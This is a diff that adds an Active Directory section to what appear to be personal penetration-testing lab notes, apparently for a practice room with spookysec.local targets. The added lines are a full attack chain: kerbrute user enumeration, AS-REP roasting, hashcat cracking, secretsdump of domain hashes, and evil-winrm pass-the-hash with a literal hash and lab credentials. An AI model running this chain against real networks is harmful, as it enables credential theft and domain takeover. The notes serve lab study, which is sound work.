@@ -125,6 +125,30 @@ service_exec(conn, r'cmd /c net localgroup administrators bill /add')
 > - https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
 
 
+## active Directory
+> - git clone https://github.com/Sq00ky/attacktive-directory-tools.git
+> #executable kerbrute
+ 
+$ chmod u=rwx kerbrute 
+$ chmod +x kerbrute #useful command
+ 
+$ ./kerbrute -h  #can see the usage for kerbrute
+
+$ ./kerbrute userenum --dc 10.10.71.93 -d spookysec.local userlist.txt -t 100
+
+$ GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin
+
+$ hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force
+
+we can again at the smb
+$ smbclient -L 10.10.116.78 -U ‘svc-admin’
+
+$ secretsdump.py -h
+$ impacket-secretsdump -just-dc <backup:backup2517860@10.10.63.2>Useful links
+
+$ evil-winrm -i 10.10.63.2 -u Administrator -H e4876a80a723612986d7609aa5ebc12b 
+
+
 
 
 
